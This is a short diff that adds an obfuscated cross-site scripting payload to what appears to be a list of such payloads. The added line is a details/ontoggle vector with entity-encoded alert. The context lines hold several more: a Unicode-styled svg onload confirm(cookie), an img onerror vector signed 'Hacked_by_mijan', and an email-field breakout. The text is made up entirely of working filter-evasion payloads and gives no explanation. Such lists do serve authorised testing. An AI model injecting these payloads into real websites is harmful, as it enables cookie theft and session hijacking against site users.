@@ -1,3 +1,4 @@
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 "><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
 <Img Src=OnXSS OnError=confirm("Hacked_by_mijan")>
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
